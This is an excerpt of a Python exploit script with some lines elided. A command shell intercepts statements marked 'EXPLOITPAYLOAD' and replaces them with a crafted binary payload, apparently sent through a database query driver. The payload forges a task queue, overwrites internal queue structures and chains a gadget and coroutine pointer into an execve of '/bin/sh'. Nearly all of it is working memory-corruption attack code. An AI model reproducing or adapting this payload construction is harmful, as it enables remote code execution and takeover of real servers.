...
def pac_rev(hex_number):
    ...
    reversed_bytes = ''.join(reversed_byte_pairs)
...
class Shell(cmd.Cmd):
    ...
    def perform_simple_statement(self, statement):
        ...
        BASH_ARG1_PTR = pac_rev(BASE_SHELLCODE+0x158) #"5801230600000000"
        BASH_ARG2_PTR = pac_rev(BASE_SHELLCODE+0x160) #"6001230600000000"
        BASH_ARG0_CONTENT = pac_rev(0x0068732f6e69622f)
        ...
        BASH_RDX = "0000000000000000"
        BASH_RCX = EXECV_FUNC
        BUFFER = "0000000000000000"
        ATQ_END_RSI = BASH_RDI

        print("working with: "+str(statement))
        if "EXPLOITPAYLOAD" in str(statement):
            
            fake_task_queue_for_aingtq = """AAAAAAAAAAAAAAAA""" + pac(BASE_SHELLCODE) + """BBBBBBBBBBBBBBBB""" + FINAL_RDI + BUFFER*8 + pac_rev(BASE_SHELLCODE+0x98) + """b043000000000000b243000000000000""" + """0f00000000000000""" + BUFFER*3 + GOLDEN_GADGET_ADDR + BUFFER + pac_rev(BASE_SHELLCODE + 0xa0) + pac_rev(BASE_SHELLCODE + 0x90) + CORO_RESUME_PTR + BUFFER*3
            execve_payload = BUFFER*8 + BASH_RSI + BUFFER + BASH_RCX + BASH_RDX + BASH_ARG0_PTR + BASH_ARG1_PTR + BASH_ARG2_PTR + BUFFER + FINAL_RDI + BASH_ARG0_CONTENT + EXECV_FUNC + BASH_ARG1_CONTENT + BASH_ARG2_CONTENT_1 + BASH_ARG2_CONTENT_2
            atq_and_aingtq_overwrite = """CCCCCCCCCCCCCCCC""" + ATQ_LEAK_ADDR + pac_rev(BASE_SHELLCODE+0x168) + ATQ_END_RSI + pac_rev(BASE_SHELLCODE)*32 + "0500000000000000" + "0600000000000000" + pac_rev(BASE_SHELLCODE)*32
            print("changed statement")
            statement = SimpleStatement(fake_task_queue_for_aingtq + execve_payload + atq_and_aingtq_overwrite)

            print(":".join("{:02x}".format(ord(c)) for c in str(statement)))
